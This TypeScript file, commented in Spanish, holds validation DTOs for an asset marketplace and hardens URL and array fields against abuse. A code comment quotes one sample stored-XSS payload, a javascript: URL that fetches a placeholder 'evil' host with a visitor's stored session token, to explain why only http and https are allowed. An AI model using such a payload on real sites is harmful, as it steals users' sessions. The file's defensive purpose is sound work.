import {
  IsString,
  IsEnum,
  IsOptional,
  IsArray,
  IsNumber,
  IsBoolean,
  IsUrl,
  MinLength,
  MaxLength,
  Min,
  ArrayMaxSize,
  ValidateNested,
} from 'class-validator';
import { Type } from 'class-transformer';

/**
 * URL de recurso apta para almacenarse y para renderizarse en la ficha publica.
 *
 * `require_protocol` + whitelist `http/https` es la parte de SEGURIDAD, no de
 * estetica: sin ella, `class-validator` acepta `javascript:...` como string y el
 * frontend lo renderiza como `href` de un `<a>` en la pagina publica del activo.
 * Un `javascript:fetch('//evil/'+localStorage.davinci_token)` guardado en un link
 * es XSS almacenado que roba la sesion de cualquier visitante que haga click.
 * `data:` queda fuera por la misma razon (data:text/html ejecuta script).
 */
const URL_OPTS = {
  protocols: ['http', 'https'],
  require_protocol: true,
  require_tld: false, // permite http://localhost:3002/uploads/... del propio servicio
};

/**
 * Un link del activo. Antes `links` era `@IsArray()` pelado, sin validar los
 * elementos: `links: [1,2,3]` llegaba entero a Prisma y reventaba en un 500 al
 * leer `.label` de un numero, y una `url: "javascript:..."` se guardaba tal cual.
 * Con `@ValidateNested` cada elemento pasa por estas reglas antes de tocar la DB.
 */
export class AssetLinkDto {
  @IsString()
  @MaxLength(80)
  label: string;

  @IsUrl(URL_OPTS)
  @MaxLength(2048)
  url: string;

  @IsOptional()
  @IsBoolean()
  isMain?: boolean;
}

export class CreateAssetDto {
  @IsString()
  @MinLength(5)
  @MaxLength(120)
  title: string;

  @IsString()
  @MinLength(50)
  @MaxLength(5000)
  description: string;

  @IsEnum(['software', 'design', 'business_model', 'content', 'brand', 'project', 'other'])
  category: string;

  @IsEnum(['exclusive', 'non_exclusive', 'temporary'])
  licenseType: string;

  @IsEnum(['fixed', 'negotiable', 'free'])
  pricingType: string;

  @IsOptional()
  @IsNumber({ maxDecimalPlaces: 2 })
  @Min(0)
  @Type(() => Number)
  price?: number;

  @IsOptional()
  @IsString()
  @MaxLength(10)
  currency?: string;

  @IsOptional()
  @IsString()
  @MaxLength(120)
  territory?: string;

  @IsOptional()
  @IsString()
  @MaxLength(120)
  duration?: string;

  // Topes de volumen. Sin ellos un solo POST podia crear 500 filas en
  // `asset_tags` o guardar un `restriction` de 20k chars: amplificacion de
  // almacenamiento y de payload al servir la ficha, y palanca de spam.
  @IsOptional()
  @IsArray()
  @ArrayMaxSize(30)
  @IsString({ each: true })
  @MaxLength(200, { each: true })
  allowedUses?: string[];

  @IsOptional()
  @IsArray()
  @ArrayMaxSize(30)
  @IsString({ each: true })
  @MaxLength(1000, { each: true })
  restrictions?: string[];

  @IsOptional()
  @IsArray()
  @ArrayMaxSize(30)
  @IsString({ each: true })
  @MaxLength(40, { each: true })
  tags?: string[];

  @IsOptional()
  @IsArray()
  @ArrayMaxSize(30)
  @ValidateNested({ each: true })
  @Type(() => AssetLinkDto)
  links?: AssetLinkDto[];

  @IsOptional()
  @IsUrl(URL_OPTS)
  @MaxLength(2048)
  coverImageUrl?: string;
}
